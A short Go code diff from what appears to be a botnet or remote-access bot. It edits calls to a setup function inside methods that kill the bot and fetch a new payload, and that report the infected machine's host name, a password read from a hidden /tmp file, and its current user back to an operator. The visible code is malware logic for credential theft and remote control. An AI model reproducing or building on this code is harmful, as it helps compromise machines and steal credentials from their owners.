@@ -50,7 +50,7 @@ func getDiskSpace() string {
 }
 
 func (b *Bot) Update() {
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		defer Kill()
 		b.Report("🖥 START UPDATING...")
 		newPayload := "." + setCall.CallBot.newPayload
@@ -74,7 +74,7 @@ func (b Bot) threadsNumber() string {
 }
 
 func (b *Bot) Information() {
-	if _, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if _, setKey := SetupCaller(); setKey {
 		b.Report("Host Name: " + getHostname())
 		b.Report("Password: " + execComd("head", "-1", "/tmp/.ffff"))
 		b.Report("Current Permission: " + execComd("whoami"))
